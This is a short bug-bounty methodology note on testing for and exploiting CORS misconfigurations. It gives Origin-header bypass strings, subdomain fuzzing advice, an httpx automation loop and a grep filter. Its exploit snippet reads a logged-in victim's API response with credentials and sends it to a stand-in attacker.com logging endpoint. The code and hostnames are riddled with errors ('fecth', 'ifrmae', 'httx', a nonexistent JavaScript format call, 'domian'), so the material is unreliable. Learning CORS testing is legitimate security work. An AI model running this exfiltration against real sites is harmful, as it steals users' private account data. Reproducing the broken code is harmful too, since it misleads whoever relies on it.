# CORS Misconfigure

Let’s cover the methods to discover CORS misconfiguration

## **Methodology**

- Check if site works by the cookies or not
- it doesn't matter if site uses CORS or not
- Set `Origin` header in the request within the same URL
- if `ACAO` and `ACAC` presents try bypass methods

## Flaws and Bypasses

- Check origin function flaw, popular vectors (for `[https://domain.tld](https://domain.tld)` and `https://subdomain.domain.tld`)

```
https://**domian.tld**.attacker.com 
https://**domian.tld**attacker.com 
https://attacker.com**domain.tld**
https://**subdomian**.attacker**domain.tld**  
https://**subdomain.domain**.attacker.**tld**
https://**subdomain.domain**attacker.**tld 
null
attacker.computer**
```

Some bypasses:

```
https://website.com%60.attacker.com
https://foo@attacker.tld:80@trip.com
https://foo@evel-host%20@trip.com
```

- To be more precise, use a fuzzer
- if there is no bypass try fuzz different subdomain (`FUZZ.domain.tld` )in `Origin` header
    - Do not brute force blindly
    - Extract all live subdomains of target and make a list
    - Check the list to see what is the white list
    - Try to find XSS in the subdomain to extract data from target domain (can be used for XSS post exploitation)

## Exploitation

if you’ve found a misconfiguration, Do not rush for the report. Try to exploit the issue

- Open an http website
- Open the browser console
- Write your exploit code

```jsx
fecth("https://domian.tld/api/information/me",{
	credentials: "include"
})
.then((response) => {
	document.location = "//attacker.com/log/?key={0}".format(response.text());
});
```

The `null` exploitation:

```jsx
<ifrmae ...>
```

## Useful flow:

# Asset → httpx → CORS Misconfiguration

The automation code is:

```jsx
cat (subdomains/urls) | while read domain; do httx -H "Origin: https://$domain" -sr -silent; done
```

Make a GF filter:

```jsx
{
		"flags": "-HriE",
		"patterns":[
				"Access-Control-Allow-Origin"
	]
}
```

then work manually on them.